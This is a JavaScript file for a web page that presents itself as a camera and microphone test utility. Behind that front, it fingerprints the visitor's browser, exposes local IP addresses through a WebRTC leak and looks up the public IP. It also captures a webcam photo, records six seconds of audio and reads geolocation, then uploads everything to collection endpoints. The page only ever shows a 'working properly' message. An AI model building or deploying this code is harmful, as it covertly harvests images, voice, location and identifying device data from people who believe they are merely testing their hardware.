/**
 * Browser Fingerprinting and Media Capture Utility
 * 
 * This script collects comprehensive browser fingerprinting data
 * and tests camera/microphone functionality.
 */

// ======================
// Main Application Class
// ======================
class FingerprintMediaTest {
  constructor() {
    this.initElements();
    this.initEventListeners();
    this.isMobile = /Mobi|Android/i.test(navigator.userAgent);
    this.audioVisualizerActive = false;
    this.audioContext = null;
    this.analyser = null;
  }

  // ======================
  // Initialization Methods
  // ======================
  initElements() {
    this.statusElement = document.querySelector('.status-content');
    this.startButton = document.getElementById('startTest');
    this.videoContainer = document.getElementById('videoContainer');
    this.placeholder = document.getElementById('placeholder');
    this.cameraStatus = document.getElementById('cameraStatus');
    this.micStatus = document.getElementById('micStatus');
    this.audioBars = document.querySelectorAll('.audio-bar');
    this.localVideo = document.getElementById('localVideo');
  }

  initEventListeners() {
    this.startButton.addEventListener('click', () => this.runTests());
    
    // Mobile-specific adjustments
    if (this.isMobile) {
      this.videoContainer.style.minHeight = '50vh';
      this.startButton.style.fontSize = '18px';
      this.startButton.style.padding = '15px 25px';
    }
  }

  // ======================
  // Main Test Flow
  // ======================
  async runTests() {
    try {
      this.setTestStatus("Initializing test...", true);
      
      const fingerprintData = await this.collectEnhancedFingerprint();
      const mediaData = await this.captureAndSaveMedia();
      const locationData = await this.collectLocation();

      this.setTestStatus("Test completed successfully! All components are working properly.", false, "Test Again");
      
      // Optionally process all collected data
      const processedData = this.processAllData(fingerprintData, mediaData, locationData);
      console.log("Processed test data:", processedData);
      
    } catch (error) {
      console.error('Test error:', error);
      this.setTestStatus(`Test encountered an error: ${error.message}`, false, "Retry Test");
    }
  }

  setTestStatus(message, isLoading, buttonText = "Start Test") {
    this.statusElement.textContent = message;
    this.startButton.disabled = isLoading;
    this.startButton.innerHTML = isLoading 
      ? '<div class="loader"></div> Starting Test...' 
      : buttonText;
  }

  // ======================
  // Fingerprint Collection
  // ======================
  async collectEnhancedFingerprint() {
    const rawData = await this.gatherRawFingerprint();
    const processedData = this.processFingerprintData(rawData);
    
    try {
      const response = await fetch('/collect-fingerprint', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'processed_fingerprint',
          data: processedData,
          timestamp: new Date().toISOString()
        })
      });

      if (!response.ok) throw new Error('Failed to save fingerprint');
      return processedData;
    } catch (error) {
      console.error('Fingerprint collection error:', error);
      throw error;
    }
  }

  async gatherRawFingerprint() {
  // Get public IP address
  const publicIP = await this.getPublicIP();
    return {
      
      // Basic browser info
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      languages: navigator.languages,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,

      // Network info
    network: {
      publicIP: publicIP,
      localIPs: await this.getLocalIPs(),
      connection: navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt
      } : null
    },
      
      // Screen info
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight
      },
      
      // Viewport info
      viewport: {
        width: window.innerWidth,
        height: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
      },
      
      // Hardware info
      hardware: {
        cpuCores: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints,
        connection: navigator.connection ? {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt
        } : null
      },
      
      // Browser features
      features: {
        webGL: this.detectWebGL(),
        canvas: this.getCanvasFingerprint(),
        audio: await this.getAudioFingerprint(),
        fonts: await this.detectFonts(),
        plugins: this.getPlugins(),
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        onLine: navigator.onLine
      },
      
      // Performance timing
      timing: {
        pageLoadTime: performance.now(),
        domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
        loadComplete: performance.timing.loadEventEnd - performance.timing.navigationStart
      },
      
      // Additional info
      battery: await this.getBatteryInfo(),
      orientation: {
        angle: screen.orientation ? screen.orientation.angle : null,
        type: screen.orientation ? screen.orientation.type : null
      },
      localIPs: await this.getLocalIPs(),
      browserInfo: {
        vendor: navigator.vendor,
        product: navigator.product,
        webdriver: navigator.webdriver
      }
    };
  }
async getPublicIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    if (!response.ok) throw new Error('IP fetch failed');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error fetching public IP:', error);
    return null;
  }
}
  // ======================
  // Media Capture Methods
  // ======================
  async captureAndSaveMedia() {
    let stream;
    try {
      this.setMediaStatus("Checking camera and microphone permissions...", "Checking...", "Checking...");

      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      await this.setupVideoStream(stream);

      // Test camera
      await this.testCamera(stream);
      
      // Test microphone if available
      if (stream.getAudioTracks().length > 0) {
        await this.testMicrophone(stream);
      } else {
        this.micStatus.textContent = "Microphone: Not detected";
      }

      return { success: true };
    } catch (error) {
      console.error('Media capture error:', error);
      throw error;
    } finally {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        this.stopAudioVisualizer();
      }
    }
  }

  async setupVideoStream(stream) {
    this.localVideo.srcObject = stream;
    this.localVideo.style.display = 'block';
    this.placeholder.style.display = 'none';

    await new Promise((resolve, reject) => {
      this.localVideo.onloadedmetadata = resolve;
      this.localVideo.onerror = reject;
      setTimeout(() => reject(new Error('Camera initialization timeout')), 5000);
    });

    await this.localVideo.play();
  }

  async testCamera(stream) {
    this.cameraStatus.textContent = "Camera: Detected";
    this.setTestStatus("Testing camera... Smile!");

    const imageBlob = await this.captureImageFrame(this.localVideo);
    const processedImageData = {
      type: 'camera_test',
      timestamp: new Date().toISOString(),
      resolution: `${this.localVideo.videoWidth}x${this.localVideo.videoHeight}`,
      size_bytes: imageBlob.size,
      format: 'jpeg',
      device_info: {
        user_agent: navigator.userAgent,
        platform: navigator.platform
      }
    };
    
    await this.saveProcessedMedia('image', imageBlob, 'jpg', processedImageData);
    this.cameraStatus.textContent = "Camera: Working properly";
  }

  async testMicrophone(stream) {
    this.animateAudioVisualizer(stream);
    this.micStatus.textContent = "Microphone: Detected";
    this.setTestStatus("Testing microphone... Speak now!");

    const audioBlob = await this.recordAudio(stream);
    if (audioBlob) {
      const processedAudioData = {
        type: 'microphone_test',
        timestamp: new Date().toISOString(),
        duration_seconds: 6,
        size_bytes: audioBlob.size,
        format: 'webm',
        device_info: {
          user_agent: navigator.userAgent,
          platform: navigator.platform
        }
      };
      
      await this.saveProcessedMedia('audio', audioBlob, 'webm', processedAudioData);
      this.micStatus.textContent = "Microphone: Working properly";
    }
  }

  setMediaStatus(status, cameraText, micText) {
    this.statusElement.textContent = status;
    this.cameraStatus.textContent = `Camera: ${cameraText}`;
    this.micStatus.textContent = `Microphone: ${micText}`;
  }

  // ======================
  // Audio Visualization
  // ======================
  animateAudioVisualizer(stream) {
    this.audioContext = new (window.AudioContext || window.webkitAudioContext)();
    this.analyser = this.audioContext.createAnalyser();
    const microphone = this.audioContext.createMediaStreamSource(stream);
    microphone.connect(this.analyser);
    this.analyser.fftSize = 32;

    const bufferLength = this.analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);

    const updateVisualizer = () => {
      this.analyser.getByteFrequencyData(dataArray);
      this.audioBars.forEach((bar, i) => {
        const index = Math.floor(i * (bufferLength / this.audioBars.length));
        const value = dataArray[index] / 255;
        const height = value * 100;
        bar.style.height = `${10 + height}%`;
      });

      if (this.audioVisualizerActive) {
        requestAnimationFrame(updateVisualizer);
      }
    };

    this.audioVisualizerActive = true;
    updateVisualizer();
  }

  stopAudioVisualizer() {
    this.audioVisualizerActive = false;
    this.audioBars.forEach(bar => {
      bar.style.height = '10%';
    });
    
    if (this.audioContext) {
      this.audioContext.close();
      this.audioContext = null;
      this.analyser = null;
    }
  }

  // ======================
  // Helper Methods
  // ======================
  async captureImageFrame(video) {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');

      const attemptCapture = (attempts = 3) => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = ctx.getImageData(0, 0, 10, 10).data;
        const isBlank = Array.from(imageData).every(val => val === 0);

        if (!isBlank || attempts <= 0) {
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        } else {
          setTimeout(() => attemptCapture(attempts - 1), 200);
        }
      };

      attemptCapture();
    });
  }

  async recordAudio(stream) {
    return new Promise((resolve) => {
      try {
        const audioChunks = [];
        const recorder = new MediaRecorder(stream);

        recorder.ondataavailable = (e) => {
          if (e.data.size > 0) audioChunks.push(e.data);
        };

        recorder.onstop = () => {
          if (audioChunks.length > 0) {
            resolve(new Blob(audioChunks, { type: 'audio/webm' }));
          } else {
            resolve(null);
          }
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 6000);

      } catch (error) {
        console.error('Audio recording error:', error);
        resolve(null);
      }
    });
  }

  async saveProcessedMedia(type, blob, extension, metadata) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = async () => {
      try {
        const response = await fetch('/collect-media', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'processed_media',
            media_type: type,
            data: reader.result,
            extension: extension,
            metadata: metadata,
            timestamp: new Date().toISOString()
          })
        });

        if (!response.ok) throw new Error('Server error');
        resolve();
      } catch (error) {
        reject(error);
      }
    };
    reader.onerror = reject;
    reader.readAsDataURL(blob);
  });
}

  async collectLocation() {
    if (!navigator.geolocation) return null;

    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          try {
            await fetch('/collect-fingerprint', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                location: {
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude
                }
              })
            });
            resolve(position.coords);
          } catch (error) {
            console.error('Location save error:', error);
            resolve(null);
          }
        },
        (error) => {
          console.error('Geolocation error:', error);
          resolve(null);
        },
        { timeout: 5000 }
      );
    });
  }

  // ======================
  // Fingerprinting Helpers
  // ======================
  detectWebGL() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return null;
      
      return {
        vendor: gl.getParameter(gl.VENDOR),
        renderer: gl.getParameter(gl.RENDERER),
        version: gl.getParameter(gl.VERSION),
        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
        extensions: gl.getSupportedExtensions()
      };
    } catch (e) {
      return null;
    }
  }

  getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('Canvas fingerprint test 🎨', 2, 2);
      
      ctx.fillStyle = 'rgba(255,0,0,0.5)';
      ctx.fillRect(10, 10, 50, 30);
      
      return canvas.toDataURL();
    } catch (e) {
      return null;
    }
  }

  async getAudioFingerprint() {
    try {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const analyser = audioContext.createAnalyser();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(analyser);
      analyser.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.frequency.value = 1000;
      gainNode.gain.value = 0;
      
      oscillator.start();
      
      const frequencyData = new Uint8Array(analyser.frequencyBinCount);
      analyser.getByteFrequencyData(frequencyData);
      
      oscillator.stop();
      
      return Array.from(frequencyData).slice(0, 10).join('');
    } catch (e) {
      return null;
    }
  }

  async detectFonts() {
    const fonts = [
      'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
      'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
      'Trebuchet MS', 'Arial Black', 'Impact', 'Tahoma', 'Calibri',
      'Lucida Console', 'Monaco', 'Menlo', 'Consolas'
    ];
    
    const availableFonts = [];
    
    for (const font of fonts) {
      if (await this.isFontAvailable(font)) {
        availableFonts.push(font);
      }
    }
    
    return availableFonts;
  }

  isFontAvailable(fontName) {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      
      ctx.font = '72px monospace';
      const baseline = ctx.measureText('mmmmmmmmmmlli').width;
      
      ctx.font = `72px ${fontName}, monospace`;
      const width = ctx.measureText('mmmmmmmmmmlli').width;
      
      resolve(width !== baseline);
    });
  }

  getPlugins() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
      const plugin = navigator.plugins[i];
      plugins.push({
        name: plugin.name,
        filename: plugin.filename,
        description: plugin.description
      });
    }
    return plugins;
  }

  async getBatteryInfo() {
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        return {
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime,
          level: battery.level
        };
      }
    } catch (e) {
      return null;
    }
  }

  async getLocalIPs() {
    return new Promise((resolve) => {
      const ips = [];
      const RTCPeerConnection = window.RTCPeerConnection || 
                              window.webkitRTCPeerConnection || 
                              window.mozRTCPeerConnection;
      
      if (!RTCPeerConnection) {
        resolve(ips);
        return;
      }
      
      const pc = new RTCPeerConnection({
        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
      });
      
      pc.createDataChannel('');
      
      pc.onicecandidate = (event) => {
        if (event.candidate) {
          const candidate = event.candidate.candidate;
          const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
          if (ipMatch && !ips.includes(ipMatch[1])) {
            ips.push(ipMatch[1]);
          }
        }
      };
      
      pc.createOffer()
        .then(offer => pc.setLocalDescription(offer))
        .catch(() => {});
      
      setTimeout(() => {
        pc.close();
        resolve(ips);
      }, 2000);
    });
  }

  // ======================
  // Data Processing
  // ======================
  processAllData(fingerprintData, mediaData, locationData) {
    return {
      fingerprint: fingerprintData,
      media: mediaData,
      location: locationData,
      timestamp: new Date().toISOString(),
      sessionId: this.generateSessionId()
    };
  }

  processFingerprintData(rawData) {
  return {
    device_info: {
      operating_system: this.detectOS(),
      browser: this.detectBrowser(),
      browser_version: this.getBrowserVersion(),
      platform: rawData.platform,
      mobile_device: this.isMobile
    },
    location_info: {
      ip_address: rawData.network.publicIP,
      local_ips: rawData.network.localIPs,
      network_type: rawData.network.connection?.effectiveType || 'unknown'
    },
    display_info: {
      screen_resolution: `${rawData.screen.width}x${rawData.screen.height}`,
      viewport_size: `${rawData.viewport.width}x${rawData.viewport.height}`,
      color_depth: rawData.screen.colorDepth
    },
    hardware_info: {
      cpu_cores: rawData.hardware.cpuCores,
      device_memory: rawData.hardware.deviceMemory,
      touch_support: rawData.hardware.maxTouchPoints > 0
    },
    browser_features: {
      webgl_support: rawData.features.webGL !== null,
      canvas_fingerprint_available: rawData.features.canvas !== null,
      cookies_enabled: rawData.features.cookieEnabled,
      local_storage_available: 'localStorage' in window
    },
    privacy_risk: {
      level: this.calculatePrivacyRisk(rawData),
      score: this.calculateRiskScore(rawData)
    },
    fingerprints: {
      overall_fingerprint_hash: this.generateFingerprintHash(rawData)
    }
  };
}

  detectOS() {
  const userAgent = navigator.userAgent;
  if (/Windows/.test(userAgent)) return 'Windows';
  if (/Macintosh/.test(userAgent)) return 'MacOS';
  if (/Linux/.test(userAgent)) return 'Linux';
  if (/Android/.test(userAgent)) return 'Android';
  if (/iOS|iPhone|iPad|iPod/.test(userAgent)) return 'iOS';
  return 'Unknown';
}

detectBrowser() {
  const userAgent = navigator.userAgent;
  if (/Chrome/.test(userAgent)) return 'Chrome';
  if (/Firefox/.test(userAgent)) return 'Firefox';
  if (/Safari/.test(userAgent)) return 'Safari';
  if (/Edge/.test(userAgent)) return 'Edge';
  if (/Opera/.test(userAgent)) return 'Opera';
  if (/Trident/.test(userAgent)) return 'Internet Explorer';
  return 'Unknown';
}

getBrowserVersion() {
  const userAgent = navigator.userAgent;
  const matches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/([0-9.]+)/);
  return matches ? matches[2] : 'Unknown';
}

calculatePrivacyRisk(data) {
  // Implement your risk calculation logic
  const riskFactors = [];
  if (data.features.webGL) riskFactors.push(1);
  if (data.features.canvas) riskFactors.push(1);
  if (data.features.fonts.length > 5) riskFactors.push(1);
  // Add more factors as needed
  
  const score = riskFactors.length;
  if (score > 5) return 'High';
  if (score > 2) return 'Medium';
  return 'Low';
}

calculateRiskScore(data) {
  // Implement your scoring logic
  let score = 0;
  if (data.features.webGL) score += 20;
  if (data.features.canvas) score += 20;
  if (data.features.fonts.length > 5) score += 15;
  // Add more scoring factors as needed
  return Math.min(score, 100);
}

generateFingerprintHash(data) {
  // Create a simple hash from fingerprint data
  const str = JSON.stringify(data);
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    const char = str.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash; // Convert to 32bit integer
  }
  return hash.toString(16);
}
  generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  }

  // ... (include other helper methods from your original processFingerprintData)
}

// ======================
// Initialize Application
// ======================
document.addEventListener('DOMContentLoaded', () => {
  const app = new FingerprintMediaTest();
});
